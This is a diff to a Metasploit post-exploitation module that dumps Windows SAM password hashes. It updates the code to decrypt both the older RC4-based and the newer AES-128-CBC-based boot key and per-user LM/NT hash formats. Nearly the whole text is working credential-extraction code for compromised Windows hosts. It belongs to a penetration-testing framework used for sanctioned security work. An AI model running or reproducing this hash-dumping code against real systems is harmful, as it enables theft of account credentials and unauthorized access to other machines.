@@ -1,14 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
 require 'msf/core/auxiliary/report'
 
 class MetasploitModule < Msf::Post
-
   include Msf::Auxiliary::Report
   include Msf::Post::Windows::Priv
   include Msf::Post::Windows::Registry
@@ -141,14 +138,28 @@ class MetasploitModule < Msf::Post
     vf = vf.data
     ok.close
 
-    hash = Digest::MD5.new
-    hash.update(vf[0x70, 16] + @sam_qwerty + bootkey + @sam_numeric)
+    revision = vf[0x68, 4].unpack('V')[0]
 
-    rc4 = OpenSSL::Cipher::Cipher.new("rc4")
-    rc4.key = hash.digest
-    hbootkey  = rc4.update(vf[0x80, 32])
-    hbootkey << rc4.final
-    return hbootkey
+    case revision
+      when 1
+        hash = Digest::MD5.new
+        hash.update(vf[0x70, 16] + @sam_qwerty + bootkey + @sam_numeric)
+
+        rc4 = OpenSSL::Cipher.new("rc4")
+        rc4.key = hash.digest
+        hbootkey  = rc4.update(vf[0x80, 32])
+        hbootkey << rc4.final
+        hbootkey
+      when 2
+        aes = OpenSSL::Cipher.new('aes-128-cbc')
+        aes.key = bootkey
+        aes.padding = 0
+        aes.decrypt
+        aes.iv = vf[0x78, 16]
+        aes.update(vf[0x88, 16]) # we need only 16 bytes
+      else
+        raise NotImplementedError, "Unknown hboot_key revision: #{revision}"
+    end
   end
 
   def capture_user_keys
@@ -202,21 +213,16 @@ class MetasploitModule < Msf::Post
     users.each_key do |rid|
       user = users[rid]
 
-      hashlm_enc = ""
-      hashnt_enc = ""
+      hashlm_off = user[:V][0x9c, 4].unpack("V")[0] + 0xcc
+      hashlm_len = user[:V][0xa0, 4].unpack("V")[0]
+      hashlm_enc = user[:V][hashlm_off, hashlm_len]
 
-      hoff = user[:V][0x9c, 4].unpack("V")[0] + 0xcc
+      hashnt_off = user[:V][0xa8, 4].unpack("V")[0] + 0xcc
+      hashnt_len = user[:V][0xac, 4].unpack("V")[0]
+      hashnt_enc = user[:V][hashnt_off, hashnt_len]
 
-      #Check if hashes exist (if 20, then we've got a hash)
-      lm_exists = user[:V][0x9c+4,4].unpack("V")[0] == 20 ? true : false
-      nt_exists = user[:V][0x9c+16,4].unpack("V")[0] == 20 ? true : false
-
-      #If we have a hashes, then parse them (Note: NT is dependant on LM)
-      hashlm_enc = user[:V][hoff + 4, 16] if lm_exists
-      hashnt_enc = user[:V][(hoff + (lm_exists ? 24 : 8)), 16] if nt_exists
-
-      user[:hashlm] = decrypt_user_hash(rid, hbootkey, hashlm_enc, @sam_lmpass)
-      user[:hashnt] = decrypt_user_hash(rid, hbootkey, hashnt_enc, @sam_ntpass)
+      user[:hashlm] = decrypt_user_hash(rid, hbootkey, hashlm_enc, @sam_lmpass, @sam_empty_lm)
+      user[:hashnt] = decrypt_user_hash(rid, hbootkey, hashnt_enc, @sam_ntpass, @sam_empty_nt)
     end
 
     users
@@ -243,34 +249,46 @@ class MetasploitModule < Msf::Post
     [convert_des_56_to_64(s1), convert_des_56_to_64(s2)]
   end
 
-  def decrypt_user_hash(rid, hbootkey, enchash, pass)
+  def decrypt_user_hash(rid, hbootkey, enchash, pass, default)
+    revision = enchash[2, 2].unpack('v')[0]
 
-    if(enchash.empty?)
-      case pass
-      when @sam_lmpass
-        return @sam_empty_lm
-      when @sam_ntpass
-        return @sam_empty_nt
-      end
-      return ""
+    case revision
+      when 1
+        if enchash.length < 20
+          return default
+        end
+
+        md5 = Digest::MD5.new
+        md5.update(hbootkey[0,16] + [rid].pack("V") + pass)
+
+        rc4 = OpenSSL::Cipher.new('rc4')
+        rc4.key = md5.digest
+        okey = rc4.update(enchash[4, 16])
+      when 2
+        if enchash.length < 40
+          return default
+        end
+
+        aes = OpenSSL::Cipher.new('aes-128-cbc')
+        aes.key = hbootkey[0, 16]
+        aes.padding = 0
+        aes.decrypt
+        aes.iv = enchash[8, 16]
+        okey = aes.update(enchash[24, 16]) # we need only 16 bytes
+      else
+        print_error("Unknown user hash revision: #{revision}")
+        return default
     end
 
     des_k1, des_k2 = rid_to_key(rid)
 
-    d1 = OpenSSL::Cipher::Cipher.new('des-ecb')
+    d1 = OpenSSL::Cipher.new('des-ecb')
     d1.padding = 0
     d1.key = des_k1
 
-    d2 = OpenSSL::Cipher::Cipher.new('des-ecb')
+    d2 = OpenSSL::Cipher.new('des-ecb')
     d2.padding = 0
     d2.key = des_k2
-
-    md5 = Digest::MD5.new
-    md5.update(hbootkey[0,16] + [rid].pack("V") + pass)
-
-    rc4 = OpenSSL::Cipher::Cipher.new('rc4')
-    rc4.key = md5.digest
-    okey = rc4.update(enchash)
 
     d1o  = d1.decrypt.update(okey[0,8])
     d1o << d1.final
